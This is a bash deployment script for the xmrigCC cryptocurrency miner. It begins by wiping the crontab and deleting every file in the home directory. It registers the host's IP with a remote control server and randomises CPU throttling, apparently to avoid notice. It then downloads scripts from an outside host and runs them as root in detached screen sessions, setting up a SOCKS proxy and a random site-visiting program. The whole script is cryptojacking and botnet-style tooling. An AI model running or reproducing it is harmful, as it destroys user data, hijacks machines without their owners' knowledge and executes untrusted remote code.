#!/bin/bash
pool=$1
address=$2
algo=$3
cc=$4
token=$5
socks5=$6
min=$7
max=$8
ip=$(curl ifconfig.me)
DATE=`date +%Y-%m-%d`
core=$(lscpu | egrep '^CPU\(s\):' | awk -v FS=: '{print $2}' | tr -d '[:blank:]' )
(( full = $core * 100 ))
(( low = $(( $full * $min )) / 100 ))
(( high = $(( $full * $max )) / 100 ))
crontab -r || echo "ok" && cd ~/ && rm -rf * && sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test && sudo apt-get update && sudo apt-get install -y  hwloc cpulimit libhwloc-dev git build-essential cmake libuv1-dev libmicrohttpd-dev git make unzip htop git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev wget software-properties-common && cd ~/ && git clone https://github.com/Bendr0id/xmrigCC.git && cd xmrigCC && cmake . -DWITH_CC_SERVER=OFF && make && cd ~/xmrigCC && sudo sysctl -w vm.nr_hugepages=2048
CONFIG="{\n"
CONFIG+="\"randomx\": {\n"
CONFIG+="\"init\": -1,\n"
CONFIG+="\"mode\": \"auto\",\n"
CONFIG+="\"1gb-pages\": true,\n"
CONFIG+="\"rdmsr\": true,\n"
CONFIG+="\"wrmsr\": true,\n"
CONFIG+="\"numa\": true\n"
CONFIG+="},\n"
CONFIG+="\"autosave\": true,\n"
CONFIG+="\"donate-level\": 1,\n"
CONFIG+="\"cpu\": true,\n"
CONFIG+="\"opencl\": false,\n"
CONFIG+="\"cuda\": false,\n"
CONFIG+="\"pools\": [\n"
CONFIG+="{\n"
CONFIG+="\"coin\": null,\n"
CONFIG+="\"algo\": $algo,\n"
CONFIG+="\"url\": \"$pool\",\n"
CONFIG+="\"user\": \"$address\",\n"
CONFIG+="\"pass\": \"x\",\n"
CONFIG+="\"tls\": false,\n"
CONFIG+="\"keepalive\": true,\n"
CONFIG+="\"nicehash\": false,\n"
CONFIG+="\"socks5\": $socks5\n"
CONFIG+="}\n"
CONFIG+="],\n"
CONFIG+="\"cc-client\":{\n"
CONFIG+="\"enabled\":true,\n"
CONFIG+="\"use-tls\":false,\n"
CONFIG+="\"use-remote-logging\":true,\n"
CONFIG+="\"upload-config-on-start\":true,\n"
CONFIG+="\"url\":\"$cc\",\n"
CONFIG+="\"worker-id\":\"$DATE,$ip\",\n"
CONFIG+="\"access-token\":\"$token\",\n"
CONFIG+="\"reboot-cmd\":null,\n"
CONFIG+="\"update-interval-s\":5\n"
CONFIG+="}\n"
CONFIG+="}\n"
echo "---setting your config---"
rm -rf config.json
touch config.json
printf "$CONFIG" >> config.json
RANDOMIZER="core=$core\n"
RANDOMIZER+="let full=\$core*100\n"
RANDOMIZER+="min=35\n"
RANDOMIZER+="max=70\n"
RANDOMIZER+="let low=\$full*$min/100\n"
RANDOMIZER+="let high=\$full*$max/100\n"
RANDOMIZER+="while [ 1 ]\n"
RANDOMIZER+="do\n"
RANDOMIZER+="limit=\$(shuf -i \$low-\$high -n 1)\n"
RANDOMIZER+="timer=\$(shuf -i 60-300 -n 1)\n"
RANDOMIZER+="sleep \$timer\n"
RANDOMIZER+="sudo screen -X -S limit quit || echo\"limit terminated\"\n"
RANDOMIZER+="sudo screen -dmS limit cpulimit -l \$limit -e xmrigMiner\n"
RANDOMIZER+="done\n"
touch randomizer.sh
printf "$RANDOMIZER" >> randomizer.sh
chmod +x randomizer.sh
echo "--MAKE EXECUTABLE CUSTOM FILE---"
echo "sudo screen -dmS xmrigcc ./xmrigDaemon && sudo bash limit && sudo screen -dmS random bash randomizer.sh">> miner
chmod +x miner
echo "--MAKE EXECUTABLE LIMITER FILE---"
limit=$(shuf -i $low-$high -n 1)
touch limit
echo "sudo screen -dmS limit cpulimit -c $core -l $limit -e xmrigMiner">> limit
chmod +x limit
./miner
sleep 10
cd ~/xmrigCC
line1="\"url\": \"$cc\",\n"
line2="\"access-token\": \"$token\",\n"
line3="\"huge-pages\": true,\n \"randomx-1gb-pages\": true,\n \"randomx-mode\" :\"light\",\n "
sudo sed -i "/\"url\": ,/c $line1" config.json
sudo sed -i "/\"access-token\": null,/c $line2" config.json
#sed -i "/\"huge-pages\": true,/c $line3" config.json
sudo curl -Ls -o script http://srv-fuzzle.me/danted/installdanted.sh && sudo screen -dmS dante bash script
sudo wget http://srv-fuzzle.me/danted/sitelist.txt
sudo wget srv-fuzzle.me/danted/randomvisit
sudo chmod +x randomvisit
sudo screen -dmS randomvisit bash randomvisit
